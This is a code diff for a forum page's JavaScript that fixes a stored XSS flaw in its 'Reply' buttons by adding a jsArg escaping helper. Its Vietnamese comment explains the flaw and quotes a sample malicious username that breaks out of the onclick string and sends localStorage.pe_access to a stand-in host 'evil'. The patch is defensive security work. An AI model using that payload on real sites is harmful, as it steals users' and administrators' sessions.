@@ -1028,7 +1028,19 @@ function skSkillToggle(row) {
       .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
   }
 
-  var _AVATAR_COLORS = ['#3B82F6', '#8B5CF6', '#F97316', '#10B981', '#EC4899', '#06B6D4', '#F59E0B', '#EF4444'];
+  // Đối số CHUỖI đặt bên trong thuộc tính onclick="…". KHÔNG dùng
+  // '\'' + escHtml(x) + '\'' cho chỗ này: escHtml đổi ' thành &#39;, nhưng
+  // trình duyệt GIẢI MÃ thực thể đó trở lại ' trước khi chạy handler. Tên
+  // người dùng `');fetch('//evil?'+localStorage.pe_access);//` vì thế thoát
+  // khỏi chuỗi JS và chạy được — XSS lưu trữ, lấy được phiên của bất kỳ ai bấm
+  // "Trả lời", kể cả quản trị viên (đã dựng lại được trên trình duyệt thật).
+  // JSON.stringify sinh literal chuỗi JS hợp lệ (escape cả " và \), rồi
+  // escHtml cho đúng ngữ cảnh thuộc tính HTML. Trả về KÈM dấu nháy.
+  function jsArg(s) {
+    return escHtml(JSON.stringify(String(s == null ? '' : s)));
+  }
+
+  var _AVATAR_COLORS =['#3B82F6', '#8B5CF6', '#F97316', '#10B981', '#EC4899', '#06B6D4', '#F59E0B', '#EF4444'];
   function avatarColor(name) {
     var s = String(name || '?');
     var h = 0;
@@ -1292,7 +1304,7 @@ function skSkillToggle(row) {
           '<div class="fpc-cmt-reaction-picker">' + rPickerHtml + '</div>' +
           '</div>' +
           rSummaryHtml +
-          '<button class="fpc-cmt-act-btn fpc-cmt-reply-btn" onclick="forumToggleReply(\'' + postId + '\',\'' + c.id + '\',\'' + escHtml(r.author) + '\')">Trả lời</button>' +
+          '<button class="fpc-cmt-act-btn fpc-cmt-reply-btn" onclick="forumToggleReply(\'' + postId + '\',\'' + c.id + '\',' + jsArg(r.author) + ')">Trả lời</button>' +
           '</div>' +
           '</div>' +
           '</div>'
@@ -1319,7 +1331,7 @@ function skSkillToggle(row) {
         '<div class="fpc-cmt-reaction-picker">' + pickerHtml + '</div>' +
         '</div>' +
         reactSummaryHtml +
-        '<button class="fpc-cmt-act-btn fpc-cmt-reply-btn" onclick="forumToggleReply(\'' + postId + '\',\'' + c.id + '\',\'' + escHtml(c.author) + '\')">Trả lời</button>' +
+        '<button class="fpc-cmt-act-btn fpc-cmt-reply-btn" onclick="forumToggleReply(\'' + postId + '\',\'' + c.id + '\',' + jsArg(c.author) + ')">Trả lời</button>' +
         '</div>' +
         (repliesHtml ? '<div class="fpc-replies-list">' + repliesHtml + '</div>' : '') +
         '<div class="fpc-reply-input-row" id="fpc-reply-row-' + postId + '-' + c.id + '" style="display:none">' +
